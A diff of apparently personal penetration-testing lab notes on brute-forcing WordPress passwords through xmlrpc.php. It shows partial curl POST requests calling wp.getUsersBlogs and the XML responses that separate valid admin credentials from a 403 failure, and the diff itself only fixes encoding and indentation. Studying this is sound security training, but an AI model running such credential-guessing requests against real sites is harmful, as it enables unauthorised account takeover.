@@ -1,6 +1,6 @@
-﻿Once we are armed with a list of valid users, we can mount a password brute-forcing attack to attempt to gain access to the WordPress backend. This attack can be performed via the login page or theÂ `xmlrpc.php`Â page.
+﻿Once we are armed with a list of valid users, we can mount a password brute-forcing attack to attempt to gain access to the WordPress backend. This attack can be performed via the login page or the`xmlrpc.php` page.
 
-If our POST request againstÂ `xmlrpc.php`Â contains valid credentials, we will receive the following output:
+If our POST request against`xmlrpc.php` contains valid credentials, we will receive the following output:
 
 #### cURL - POST Request
 
@@ -10,25 +10,25 @@ smoothment@htb[/htb]$ curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs<
 
 <?xml version="1.0" encoding="UTF-8"?>
 <methodResponse>
-  <params>
-    <param>
-      <value>
-      <array><data>
-  <value><struct>
-  <member><name>isAdmin</name><value><boolean>1</boolean></value></member>
-  <member><name>url</name><value><string>http://blog.inlanefreight.com/</string></value></member>
-  <member><name>blogid</name><value><string>1</string></value></member>
-  <member><name>blogName</name><value><string>Inlanefreight</string></value></member>
-  <member><name>xmlrpc</name><value><string>http://blog.inlanefreight.com/xmlrpc.php</string></value></member>
+ <params>
+ <param>
+ <value>
+ <array><data>
+ <value><struct>
+ <member><name>isAdmin</name><value><boolean>1</boolean></value></member>
+ <member><name>url</name><value><string>http://blog.inlanefreight.com/</string></value></member>
+ <member><name>blogid</name><value><string>1</string></value></member>
+ <member><name>blogName</name><value><string>Inlanefreight</string></value></member>
+ <member><name>xmlrpc</name><value><string>http://blog.inlanefreight.com/xmlrpc.php</string></value></member>
 </struct></value>
 </data></array>
-      </value>
-    </param>
-  </params>
+ </value>
+ </param>
+ </params>
 </methodResponse>
 ```
 
-If the credentials are not valid, we will receive aÂ `403 faultCode`Â error.
+If the credentials are not valid, we will receive a`403 faultCode` error.
 
 #### Invalid Credentials - 403 Forbidden
 
@@ -37,20 +37,20 @@ smoothment@htb[/htb]$ curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs<
 
 <?xml version="1.0" encoding="UTF-8"?>
 <methodResponse>
-  <fault>
-    <value>
-      <struct>
-        <member>
-          <name>faultCode</name>
-          <value><int>403</int></value>
-        </member>
-        <member>
-          <name>faultString</name>
-          <value><string>Incorrect username or password.</string></value>
-        </member>
-      </struct>
-    </value>
-  </fault>
+ <fault>
+ <value>
+ <struct>
+ <member>
+ <name>faultCode</name>
+ <value><int>403</int></value>
+ </member>
+ <member>
+ <name>faultString</name>
+ <value><string>Incorrect username or password.</string></value>
+ </member>
+ </struct>
+ </value>
+ </fault>
 </methodResponse>
 ```
 
